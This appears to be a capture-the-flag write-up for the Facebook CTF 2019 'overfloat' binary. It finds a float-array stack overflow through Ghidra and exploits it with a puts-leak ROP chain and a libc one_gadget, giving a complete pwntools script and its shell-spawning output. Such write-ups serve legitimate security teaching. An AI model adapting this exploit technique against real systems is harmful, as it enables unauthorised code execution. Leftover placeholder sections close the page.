---
search:
  exclude: true
---
# Facebook CTF 2019 Overfloat

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → wget -q https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/fb19_overfloat/overfloat
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → wget -q https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/fb19_overfloat/libc-2.27.so
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → wget -q https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/fb19_overfloat/core
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → l
    total 4.3M
    drwxr-xr-x  2 nothing nothing 4.0K Mar  6 19:11 .
    drwxr-xr-x 12 nothing nothing 4.0K Mar  6 19:10 ..
    -rw-r--r--  1 nothing nothing 2.3M Mar  6 19:11 core
    -rw-r--r--  1 nothing nothing 2.0M Mar  6 19:10 libc-2.27.so
    -rw-r--r--  1 nothing nothing  14K Mar  6 19:10 overfloat
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → file overfloat
    overfloat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → chmod +x overfloat
    
    

` ![]()

## Solution 

Now let's start off by testing the binary after using pwn checksec on it:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → pwn checksec overfloat
    [*] '/home/nothing/binexp/2/overf/overfloat'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → ./overfloat
                                     _ .--.
                                    ( `    )
                                 .-'      `--,
                      _..----.. (             )`-.
                    .'_|` _|` _|(  .__,           )
                   /_|  _|  _|  _(        (_,  .-'
                  ;|  _|  _|  _|  '-'__,--'`--'
                  | _|  _|  _|  _| |
              _   ||  _|  _|  _|  _|
            _( `--.\_|  _|  _|  _|/
         .-'       )--,|  _|  _|.`
        (__, (_      ) )_|  _| /
          `-.__.\ _,--'\|__|__/
                        ;____;
                         \YT/
                          ||
                         |""|
                         '=='
    
    WHERE WOULD YOU LIKE TO GO?
    LAT[0]: 1
    LON[0]: 2
    LAT[1]: 3
    LON[1]: 4
    LAT[2]: 5
    LON[2]: 6
    LAT[3]: 7
    LON[3]: 8
    LAT[4]: 9
    LON[4]: 10
    LAT[5]: 0
    LON[5]: 11
    LAT[6]: 111111111111111111111111111111
    LON[6]: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
    LAT[7]: LON[7]: 12334556778
    LAT[8]: ^C
    
    

So we cna see that we are given a 64bit, dynamically linked binary with a non-executable stack (NX). In addition to that, we are given the libc file **libc-2.27.so**. Running the program we see that it prompts us for latitude / longitude pairs, so let's check out what we can find when we reverse the file with ghidra: 

![](46.png)
    
    
    undefined8 main(void)
    
    {
      undefined local_38 [48];
      
      setbuf(stdout,(char *)0x0);
      setbuf(stdin,(char *)0x0);
      alarm(0x1e);
      __sysv_signal(0xe,timeout);
      puts(
          "                                 _ .--.        \n                                ( `    )      \n                             .-\'      `--,     \n                  _..----.. (            )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(       (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _| _|  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_| _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_     ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                   ;____;                     \n                     \\YT/                     \n                     ||                       \n                     |\"\"|                    \n                    \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?"
          );
      memset(local_38,0,0x28);
      chart_course(local_38);
      puts("BON VOYAGE!");
      return 0;
    }
    
    

Looking through the code here, we see that the part that's interesting is the char_course function, which takes the pointer local_38 as an arguement. When we look at the chart_course dissassembled function in ghidra we see the following: 
    
    
    void chart_course(long param_1)
    
    {
      int iVar1;
      uint uVar2;
      double dVar3;
      char local_78 [104];
      float local_10;
      uint local_c;
      
      local_c = 0;
      do {
        if ((local_c & 1) == 0) {
          iVar1 = (int)local_c / 2;
          uVar2 = iVar1 + ((iVar1 / 10 + ((int)(local_c - ((int)local_c >> 0x1f)) >> 0x1f)) -
                          (iVar1 >> 0x1f)) * -10;
          printf("LAT[%d]: ",(ulong)uVar2,(ulong)uVar2);
        }
        else {
          iVar1 = (int)local_c / 2;
          uVar2 = iVar1 + ((iVar1 / 10 + ((int)(local_c - ((int)local_c >> 0x1f)) >> 0x1f)) -
                          (iVar1 >> 0x1f)) * -10;
          printf("LON[%d]: ",(ulong)uVar2,(ulong)uVar2,(ulong)uVar2);
        }
        fgets(local_78,100,stdin);
        iVar1 = strncmp(local_78,"done",4);
        if (iVar1 == 0) {
          if ((local_c & 1) == 0) {
            return;
          }
          puts("WHERES THE LONGITUDE?");
          local_c = local_c - 1;
        }
        else {
          dVar3 = atof(local_78);
          local_10 = (float)dVar3;
          memset(local_78,0,100);
          *(float *)(param_1 + (long)(int)local_c * 4) = local_10;
        }
        local_c = local_c + 1;
      } while( true );
    }
    
    

Here we see that our data is being scanned into the char ptr that is being passed in the function as an arguement (param_1) It scans 100 bytes of data into local_78 thanks to the memset() function call
    
    
          dVar3 = atof(local_78);
          local_10 = (float)dVar3;
          **memset(local_78,0,100);**
          *(float *)(param_1 + (long)(int)local_c * 4) = local_10;
    

after the memset call, it is setting ptr + (x * 4) equal to **float** where x is equal to the amount of floats already scanned in. There are no checks to see if the buffer gets overflowed, therefore, we have our buffer overflow right here.

That is ran within a do{}while() loop, that on paper can run forever since we have **true** as the condition. However there the termination condition is if the first 4 bytes of our input are **done** as you can see below:
    
    
        fgets(local_78,100,stdin);
        iVar1 = strncmp(local_78,"done",4);
    

Therefore, keep in mind that the buffer that we are overflowing is from the stack in the main function, so we need to return to the main function before we can get code execution. Now let's take a look at the stack in ghidra:
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main()
                 undefined         AL:1           
                 undefined1        Stack[-0x38]:1 local_38                                XREF[2]:     004009ed(*), 
                                                                                                       00400a03(*)  
                 undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     0040099b(W)  
                 undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040099e(W)  
                                 main                                            XREF[5]:     Entry Point(*), 
                                                                                              _start:0040075d(*), 
                                                                                              _start:0040075d(*), 00400ea0, 
                                                                                              00400f70(*)  
            00400993 55              PUSH       RBP
    
    

Looking at the stack, there is nothing between local_38 (the variable of our input text) and the saved base pointer. Add on 8 bytes for the saved base pointer to the 48 bytes for the space, of our local_48 variable, and we get a total of **56** bytes to reach the return address. Now what code do we execute ? We're going to go with a ROP Chain using gadgets and imported functions from the binary since PIE is disabled, therefore we don't need an infoleak to do this. The problem is that the binary is not too big so we don't have the gadgets we would need to spawn a shell. 

To counter this, we can setup a **puts** call because it is an imported function, therefore we can call it with the **got address of puts** we can get a libc infoleak and then loop back around to the start of **main** which would allow us to exploit the same bug again witha libc infoleak. We can then write a onegadget to the return address to actually spawn a shell.
    
    
    ****[ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → objdump -D overfloat| grep puts
    0000000000400690 <****puts@plt>:
      400690:       ff 25 8a 19 20 00       jmp    *0x20198a(%rip)        # 602020 <****puts@GLIBC_2.2.5>
      400846:       e8 45 fe ff ff          call   400690 <****puts@plt>
      400933:       e8 58 fd ff ff          call   400690 <****puts@plt>
      4009e8:       e8 a3 fc ff ff          call   400690 <****puts@plt>
      400a14:       e8 77 fc ff ff          call   400690 <****puts@plt>

So here we have the plt addrets of **puts** as **0x400690** Next we need the got entry address for puts:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → objdump -R overfloat| grep puts
    0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
    
    

Now that we have the got entry address, we need a gadget that pops an arguement into rdi and then return:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → ROPgadget --binary overfloat| grep ": pop rdi"
    0x0000000000400a83 : pop rdi ; ret
    
    

After we get the libc infoleak, we can just subtract the offset of puts from it to get the libc base. The only part that remains is the onegadget, check out the previous babyboi writeup to know how to set it up [here](bboi.md):
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → one_gadget libc-2.27.so
    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
    
    0x4f322 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    
    0x10a38c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    
    

And with this, we have everything we need to build our exploit. Since all of our inputs are interpreted as floats, We have to jump through a few hoops to get our inputs correctly:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/overf]
    → vim exploit.py
    
    
    
    
    from pwn import *
    import struct
    
    # values of the rop chain
    putsPlt         = 0x400690
    putsGot         = 0x602020
    popRdi          = 0x400a83
    startMain       = 0x400993
    oneShot         = 0x4f2c5
    
    #helper functions to help with the float input
    pf = lambda x: struct.pack('f', x)
    uf = lambda x: struct.unpack('f', x)[0]
    
    #target process
    target = process('./overfloat')
    libc = ELF('libc-2.27.so')
    
    #helper function to send input:
    def sendVal(x):
            v1 = x & ((2**32) - 1)
            v2 = x >> 32
            target.sendline(str(uf(p32(v1))))
            target.sendline(str(uf(p32(v2))))
    
    #fill up the space between the start of the input and the return address
    for i in range(7):
            sendVal(0xdeadbeefdeadbeef)
    
    #send the ropchain to print the libc address of puts
    #loop around to the start of main
    
    sendVal(popRdi)
    sendVal(putsGot)
    sendVal(putsPlt)
    sendVal(startMain)
    
    # Send done so our code executes
    target.sendline(b'done')
    
    # Print out the target output
    print(target.recvuntil(b'BON VOYAGE!\n'))
    
    # Scan in, filter out the libc infoleak, calculate the base
    leak = target.recv(6)
    leak = u64(leak + b"\x00"*(8-len(leak)))
    base = leak - libc.symbols['puts']
    
    print("libc base: " + hex(base))
    
    for i in range(7):
            sendVal(0xdeadbeefdeadbeef)
    # Overwrite the return address with a onegadget
    sendVal(base + oneShot)
    
    # Send done so our rop chain executes
    target.sendline(b'done')
    
    target.interactive()
    
    

Now let's test it:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/overf]
    → l
    total 4.3M
    drwxr-xr-x  2 nothing nothing 4.0K Mar  6 20:34 .
    drwxr-xr-x 12 nothing nothing 4.0K Mar  6 19:10 ..
    -rw-r--r--  1 nothing nothing 2.3M Mar  6 19:11 core
    -rw-r--r--  1 nothing nothing 1.3K Mar  6 20:34 exploit.py
    -rw-r--r--  1 nothing nothing 2.0M Mar  6 19:10 libc-2.27.so
    -rwxr-xr-x  1 nothing nothing  14K Mar  6 19:10 overfloat
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/overf]
    → python3 exploit.py
    [+] Starting local process './overfloat': pid 2897697
    [*] '/home/nothing/binexp/2/overf/libc-2.27.so'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    b'                                 _ .--.        \n                                ( `    )       \n                             .-\'      `--,     \n                  _..----.. (             )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(        (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _|  _|  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_|  _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_      ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                    ;____;                     \n                     \\YT/                     \n                      ||                       \n                     |""|                    \n                     \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?\nLAT[0]: LON[0]: LAT[1]: LON[1]: LAT[2]: LON[2]: LAT[3]: LON[3]: LAT[4]: LON[4]: LAT[5]: LON[5]: LAT[6]: LON[6]: LAT[7]: LON[7]: LAT[8]: LON[8]: LAT[9]: LON[9]: LAT[0]: LON[0]: LAT[1]: BON VOYAGE!\n'
    libc base: 0x7f4b371d8310
    [*] Switching to interactive mode
    
                                     _ .--.
                                    ( `    )
                                 .-'      `--,
                      _..----.. (             )`-.
                    .'_|` _|` _|(  .__,           )
                   /_|  _|  _|  _(        (_,  .-'
                  ;|  _|  _|  _|  '-'__,--'`--'
                  | _|  _|  _|  _| |
              _   ||  _|  _|  _|  _|
            _( `--.\_|  _|  _|  _|/
         .-'       )--,|  _|  _|.`
        (__, (_      ) )_|  _| /
          `-.__.\ _,--'\|__|__/
                        ;____;
                         \YT/
                          ||
                         |""|
                         '=='
    
    WHERE WOULD YOU LIKE TO GO?
    LAT[0]: LON[0]: LAT[1]: LON[1]: LAT[2]: LON[2]: LAT[3]: LON[3]: LAT[4]: LON[4]: LAT[5]: LON[5]: LAT[6]: LON[6]: LAT[7]: LON[7]: LAT[8]: BON VOYAGE!
    [*] Got EOF while reading in interactive
    $ cat flag
    flag{g0ttem_b0yz}
    
    

And that's it! We have been able to spawn a shell and print the flag.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

